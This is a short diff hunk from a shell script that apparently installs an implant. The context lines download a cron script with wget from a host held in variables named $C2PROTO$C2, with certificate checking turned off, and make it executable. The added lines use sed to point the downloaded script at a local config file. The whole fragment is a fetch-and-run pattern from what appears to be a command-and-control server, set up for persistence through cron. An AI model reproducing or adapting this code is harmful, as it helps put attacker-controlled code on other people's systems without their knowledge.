@@ -85,6 +85,9 @@ if ! [ -f "$LOKIHOME/$MYNAME-cron.sh" ]; then
 # Need some error checking here
 	$WGET -O $LOKIHOME/$MYNAME-cron.sh --no-check-certificate $C2PROTO$C2/base-cron.sh
 	$CHMOD +x $LOKIHOME/$MYNAME-cron.sh
+	
+	# Now, update the CONFIG line to point to the correct config
+	sed -i "s|^CONFIG.*$|source $LOKIHOME/config.sh|g" $LOKIHOME/$MYNAME-cron.sh
 fi
 
 
